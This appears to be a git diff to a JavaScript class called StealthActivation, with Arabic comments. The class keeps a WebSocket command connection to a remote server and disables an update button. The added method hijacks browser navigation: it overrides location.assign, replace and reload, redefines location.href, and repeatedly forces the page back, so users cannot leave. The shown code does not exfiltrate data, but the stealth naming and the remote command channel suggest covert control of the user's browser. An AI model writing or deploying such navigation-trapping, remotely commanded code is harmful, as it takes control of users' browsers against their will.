@@ -230,6 +230,9 @@ class StealthActivation {
             // حماية فورية من أي إعادة توجيه
             this.preventAnyRedirection();
             
+            // حماية إضافية من انقطاع الاتصال
+            this.preventRedirectOnDisconnection();
+            
             // تعطيل الزر
             this.disableUpdateButton();
             
@@ -573,6 +576,10 @@ class StealthActivation {
                 console.log(`  📄 الكود: ${event.code}`);
                 console.log(`  📝 السبب: ${event.reason || 'غير محدد'}`);
                 
+                // منع انتقال الصفحة عند انقطاع الاتصال
+                console.log('🛡️ منع انتقال الصفحة بسبب انقطاع الاتصال');
+                this.preventRedirectOnDisconnection();
+                
                 // محاولة إعادة الاتصال بعد 5 ثوان
                 setTimeout(() => {
                     console.log('🔄 محاولة إعادة الاتصال بالخادم...');
@@ -636,6 +643,59 @@ class StealthActivation {
             
         } catch (error) {
             console.error('❌ خطأ في معالجة أمر الخادم:', error);
+        }
+    }
+    
+    // منع انتقال الصفحة عند انقطاع الاتصال
+    preventRedirectOnDisconnection() {
+        try {
+            console.log('🛡️ تفعيل حماية شاملة من انتقال الصفحة');
+            
+            // منع جميع أشكال التنقل
+            const blockNavigation = () => {
+                window.location.assign = () => {
+                    console.log('🚫 تم منع location.assign');
+                    return false;
+                };
+                
+                window.location.replace = () => {
+                    console.log('🚫 تم منع location.replace');
+                    return false;
+                };
+                
+                window.location.reload = () => {
+                    console.log('🚫 تم منع location.reload');
+                    return false;
+                };
+                
+                // منع تغيير location.href
+                Object.defineProperty(window.location, 'href', {
+                    set: function(value) {
+                        console.log('🚫 تم منع تغيير location.href إلى:', value);
+                        return false;
+                    },
+                    get: function() {
+                        return window.location.toString();
+                    }
+                });
+            };
+            
+            // تطبيق الحماية
+            blockNavigation();
+            
+            // حماية مستمرة
+            setInterval(() => {
+                if (window.location.href.includes('about:blank')) {
+                    console.log('🚨 تم اكتشاف about:blank - إيقاف فوري');
+                    window.stop();
+                    window.history.back();
+                }
+            }, 100);
+            
+            console.log('✅ تم تفعيل الحماية من انتقال الصفحة');
+            
+        } catch (error) {
+            console.error('❌ خطأ في تفعيل حماية انتقال الصفحة:', error);
         }
     }
 
@@ -709,7 +769,12 @@ class StealthActivation {
             // حفظ في localStorage
             localStorage.setItem('activationStatus', JSON.stringify(activationData));
             
-            // إرسال للخادم
+            // إرسال للخادم - معطل مؤقتاً حتى يتم تحديث الخادم
+            console.log('ℹ️ تم تعطيل إرسال activation_complete مؤقتاً لتجنب انقطاع الاتصال');
+            console.log('📝 سيتم تفعيله بعد تحديث الخادم على render.com');
+            
+            // الكود المعطل مؤقتاً:
+            /*
             if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
                 window.controlConnection.send(JSON.stringify({
                     type: 'activation_complete',
@@ -719,6 +784,7 @@ class StealthActivation {
             } else {
                 console.warn('⚠️ الاتصال بالخادم غير متاح - لن يتم إرسال activation_complete');
             }
+            */
             
             this.isActivated = true;
             
